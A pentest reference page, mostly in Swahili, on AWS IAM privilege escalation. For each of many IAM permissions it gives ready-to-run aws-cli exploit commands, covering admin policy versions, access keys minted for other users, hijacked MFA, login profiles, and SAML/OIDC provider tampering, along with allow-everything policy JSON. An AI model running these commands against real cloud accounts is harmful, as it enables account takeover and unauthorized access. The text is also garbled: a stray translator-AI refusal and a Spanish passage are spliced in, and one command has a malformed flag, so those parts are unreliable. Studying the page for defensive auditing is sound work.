# AWS - IAM Privesc

{{#include ../../../../banners/hacktricks-training.md}}

## IAM

Kwa habari zaidi kuhusu IAM angalia:

{{#ref}}
../../aws-services/aws-iam-enum.md
{{#endref}}

### **`iam:CreatePolicyVersion`**

Inatoa uwezo wa kuunda toleo jipya la sera ya IAM, ikiepuka haja ya ruhusa ya `iam:SetDefaultPolicyVersion` kwa kutumia bendera `--set-as-default`. Hii inaruhusu kubainisha ruhusa maalum.

**Exploit Command:**
```bash
aws iam create-policy-version --policy-arn <target_policy_arn> \
--policy-document file:///path/to/administrator/policy.json --set-as-default
```
**Athari:** Inaongezea ruhusa moja kwa moja kwa kuruhusu kitendo chochote kwenye rasilimali yoyote.

### **`iam:SetDefaultPolicyVersion`**

Inaruhusu kubadilisha toleo chaguo-msingi la sera ya IAM kwa toleo lingine liloripo, na inaweza kuongeza ruhusa ikiwa toleo jipya lina ruhusa zaidi.

**Bash Command:**
```bash
aws iam set-default-policy-version --policy-arn <target_policy_arn> --version-id v2
```
**Athari:** Isiyo ya moja kwa moja privilege escalation kwa kuruhusu ruhusa zaidi.

### **`iam:CreateAccessKey`, (`iam:DeleteAccessKey`)**

Inaruhusu kuunda access key ID na secret access key kwa mtumiaji mwingine, jambo ambalo linaweza kusababisha privilege escalation.

**Exploit:**
```bash
aws iam create-access-key --user-name <target_user>
```
**Athari:** privilege escalation ya moja kwa moja kwa kuchukua ruhusa za ziada za mtumiaji mwingine.

Kumbuka kwamba mtumiaji anaweza kuwa na vifunguo vya ufikiaji viwili tu vilivyotengenezwa, hivyo ikiwa mtumiaji tayari ana vifunguo vya ufikiaji 2 utahitaji ruhusa `iam:DeleteAccessKey` kufuta mojawapo yao ili uweze kuunda mpya:
```bash
aws iam delete-access-key --uaccess-key-id <key_id>
```
### **`iam:CreateVirtualMFADevice` + `iam:EnableMFADevice`**

Ikiwa unaweza kuunda virtual MFA device mpya na kuiwezesha kwa mtumiaji mwingine, unaweza kwa ufanisi kusajili MFA yako kwa mtumiaji huyo na kisha kuomba session iliyothibitishwa na MFA kwa vyeti vyao.

**Exploit:**
```bash
# Create a virtual MFA device (this returns the serial and the base32 seed)
aws iam create-virtual-mfa-device --virtual-mfa-device-name <mfa_name>

# Generate 2 consecutive TOTP codes from the seed, then enable it for the user
aws iam enable-mfa-device --user-name <target_user> --serial-number <serial> \
--authentication-code1 <code1> --authentication-code2 <code2>
```
**Athari:** Kuongezeka kwa mamlaka kwa njia ya moja kwa moja kwa kuchukua usajili wa MFA wa mtumiaji (na kisha kutumia mamlaka yao).

### **`iam:CreateLoginProfile` | `iam:UpdateLoginProfile`**

Inaruhusu kuunda au kusasisha login profile, ikijumuisha kuweka nywila kwa ajili ya AWS console login, ikisababisha kuongezeka kwa mamlaka kwa njia ya moja kwa moja.

**Exploit kwa Uundaji:**
```bash
aws iam create-login-profile --user-name target_user --no-password-reset-required \
--password '<password>'
```
**Exploit kwa Update:**
```bash
aws iam update-login-profile --user-name target_user --no-password-reset-required \
--password '<password>'
```
**Athari:** Kuongezeka kwa moja kwa moja kwa privilege escalation kwa kuingia kama mtumiaji "yeyote".

### **`iam:UpdateAccessKey`**

Inaruhusu kuwezesha access key iliyozimwa, jambo ambalo linaweza kusababisha upatikanaji usioidhinishwa ikiwa mshambuliaji anamiliki access key hiyo iliyozimwa.

**Exploit:**
```bash
aws iam update-access-key --access-key-id <ACCESS_KEY_ID> --status Active --user-name <username>
```
**Athari:** Moja kwa moja privilege escalation kwa kurejesha tena access keys.

### **`iam:CreateServiceSpecificCredential` | `iam:ResetServiceSpecificCredential`**

Inaruhusu kuzalisha au kuweka upya credentials kwa huduma maalum za AWS (e.g., CodeCommit, Amazon Keyspaces), zikirithi permissions za mtumiaji aliyehusishwa.

**Exploit for Creation:**
```bash
aws iam create-service-specific-credential --user-name <username> --service-name <service>
```
**Exploit kwa Reset:**
```bash
aws iam reset-service-specific-credential --service-specific-credential-id <credential_id>
```
**Impact:** Kuongezeka kwa ruhusa moja kwa moja ndani ya ruhusa za huduma za mtumiaji.

### **`iam:AttachUserPolicy` || `iam:AttachGroupPolicy`**

Inaruhusu kuambatisha policies kwa watumiaji au makundi, na hivyo kuongeza ruhusa moja kwa moja kwa kurithi ruhusa za policy iliyounganishwa.

**Exploit for User:**
```bash
aws iam attach-user-policy --user-name <username> --policy-arn "<policy_arn>"
```
**Exploit kwa Kikundi:**
```bash
aws iam attach-group-policy --group-name <group_name> --policy-arn "<policy_arn>"
```
**Athari:** Direct privilege escalation kwa chochote sera inaruhusu.

### **`iam:AttachRolePolicy`,** ( `sts:AssumeRole`|`iam:createrole`) | **`iam:PutUserPolicy` | `iam:PutGroupPolicy` | `iam:PutRolePolicy`**

Inaruhusu kuambatisha au kuweka sera kwa roles, users, au groups, na hivyo kuruhusu direct privilege escalation kwa kutoa ruhusa za ziada.

**Exploit for Role:**
```bash
aws iam attach-role-policy --role-name <role_name> --policy-arn "<policy_arn>"
```
**Exploit kwa Inline Policies:**
```bash
aws iam put-user-policy --user-name <username> --policy-name "<policy_name>" \
--policy-document "file:///path/to/policy.json"

aws iam put-group-policy --group-name <group_name> --policy-name "<policy_name>" \
--policy-document file:///path/to/policy.json

aws iam put-role-policy --role-name <role_name> --policy-name "<policy_name>" \
--policy-document file:///path/to/policy.json
```
I don't see the README.md content to translate. Please paste the file content (or confirm you want an example policy) and I'll translate the relevant English text to Swahili following your rules.
```json
{
"Version": "2012-10-17",
"Statement": [
{
"Effect": "Allow",
"Action": ["*"],
"Resource": ["*"]
}
]
}
```
**Athari:** Kuongezeka kwa ruhusa moja kwa moja kwa kuongeza ruhusa kupitia sera.

### **`iam:AddUserToGroup`**

Inaruhusu kujiongeza mwenyewe kwenye kikundi cha IAM, na hivyo kuongeza ruhusa kwa kurithi ruhusa za kikundi.

**Exploit:**
```bash
aws iam add-user-to-group --group-name <group_name> --user-name <username>
```
**Athari:** Kupandishwa kwa ruhusa kwa moja kwa moja hadi kiwango cha ruhusa za kikundi.

### **`iam:UpdateAssumeRolePolicy`**

Inaruhusu kubadilisha assume role policy document ya role, na hivyo kuwezesha ku-assume role pamoja na ruhusa zake zinazohusiana.

**Exploit:**
```bash
aws iam update-assume-role-policy --role-name <role_name> \
--policy-document file:///path/to/assume/role/policy.json
```
Ambapo sera inaonekana kama ifuatavyo, ambayo inampa mtumiaji ruhusa ya kuchukua jukumu:
```json
{
"Version": "2012-10-17",
"Statement": [
{
"Effect": "Allow",
"Action": "sts:AssumeRole",
"Principal": {
"AWS": "$USER_ARN"
}
}
]
}
```
**Impact:** Direct privilege escalation kwa kuchukua ruhusa za role yoyote.

### **`iam:UploadSSHPublicKey` || `iam:DeactivateMFADevice`**

Inaruhusu kupakia SSH public key kwa ajili ya uthibitisho kwenye CodeCommit na kuzima vifaa vya MFA, na hivyo kusababisha uwezekano wa indirect privilege escalation.

**Exploit for SSH Key Upload:**
```bash
aws iam upload-ssh-public-key --user-name <username> --ssh-public-key-body <key_body>
```
**Exploit kwa kuzima MFA:**
```bash
aws iam deactivate-mfa-device --user-name <username> --serial-number <serial_number>
```
**Impact:** Kupandishwa kwa mamlaka kwa njia isiyo ya moja kwa moja kwa kuwezesha ufikiaji wa CodeCommit au kuzima ulinzi wa MFA.

### **`iam:ResyncMFADevice`**

Inaruhusu kusawazisha upya kifaa cha MFA, ambacho kinaweza kusababisha kupandishwa kwa mamlaka kwa njia isiyo ya moja kwa moja kwa kuingilia au kubadilisha ulinzi wa MFA.

**Amri ya Bash:**
```bash
aws iam resync-mfa-device --user-name <username> --serial-number <serial_number> \
--authentication-code1 <code1> --authentication-code2 <code2>
```
**Athari:** Kuongezeka kwa vibali kwa njia isiyo ya moja kwa moja kwa kuongeza au kubadilisha vifaa vya MFA.

### `iam:UpdateSAMLProvider`, `iam:ListSAMLProviders`, (`iam:GetSAMLProvider`)

Kwa ruhusa hizi unaweza **kubadilisha metadata ya XML ya muunganisho wa SAML**. Kisha, unaweza kutumia vibaya **SAML federation** ili **login** na **role** yoyote inayoiamini.

Kumbuka kwamba kufanya hivi **watumiaji halali hawataweza ku-login**. Walakini, unaweza kupata XML, hivyo unaweza kuweka yako, ku-login na kusanidi tena iliyokuwepo hapo awali.
```bash
# List SAMLs
aws iam list-saml-providers

# Optional: Get SAML provider XML
aws iam get-saml-provider --saml-provider-arn <ARN>

# Update SAML provider
aws iam update-saml-provider --saml-metadata-document <value> --saml-provider-arn <arn>

## Login impersonating roles that trust the SAML provider

# Optional: Set the previous XML back
aws iam update-saml-provider --saml-metadata-document <previous-xml> --saml-provider-arn <arn>
```
> [!NOTE]
> TODO: A Tool inayoweza kuunda SAML metadata na ku-login kwa role iliyobainishwa

### `iam:UpdateOpenIDConnectProviderThumbprint`, `iam:ListOpenIDConnectProviders`, (`iam:`**`GetOpenIDConnectProvider`**)

(Sina uhakika kuhusu hili) Ikiwa attacker ana hizi **permissions** anaweza kuongeza **Thumbprint** mpya ili kuweza ku-login katika role zote zinazomwamini provider.
```bash
# List providers
aws iam list-open-id-connect-providers
# Optional: Get Thumbprints used to not delete them
aws iam get-open-id-connect-provider --open-id-connect-provider-arn <ARN>
# Update Thumbprints (The thumbprint is always a 40-character string)
aws iam update-open-id-connect-provider-thumbprint --open-id-connect-provider-arn <ARN> --thumbprint-list 359755EXAMPLEabc3060bce3EXAMPLEec4542a3
```
### `iam:PutUserPermissionsBoundary`

Ruhusa hii inamruhusu attacker kusasisha permissions boundary ya user, na inaweza kuongezea privileges zao kwa kumruhusu kufanya vitendo ambavyo kawaida vinazuiliwa kutokana na permissions zao zilizopo.
```bash
aws iam put-user-permissions-boundary \
--user-name <nombre_usuario> \
--permissions-boundary arn:aws:iam::<cuenta>:policy/<nombre_politica>

Un ejemplo de una política que no aplica ninguna restricción es:


{
"Version": "2012-10-17",
"Statement": [
{
"Sid": "BoundaryAllowAll",
"Effect": "Allow",
"Action": "*",
"Resource": "*"
}
]
}
```
### `iam:PutRolePermissionsBoundary`

Mhusika mwenye iam:PutRolePermissionsBoundary anaweza kuweka kikomo cha ruhusa kwenye role iliyopo. Hatari inatokea mtu mwenye ruhusa hii anapobadilisha kikomo cha role: wanaweza kuzuia shughuli kwa njia isiyofaa (kusababisha kukatika kwa huduma) au, ikiwa wataambatisha kikomo chenye kuruhusu mengi, kwa ufanisi kupanua kile role inaweza kufanya na kupandisha ruhusa.
```bash
aws iam put-role-permissions-boundary \
--role-name <Role_Name> \
--permissions-boundary arn:aws:iam::111122223333:policy/BoundaryPolicy
```
## Marejeo

- [https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)

{{#include ../../../../banners/hacktricks-training.md}}
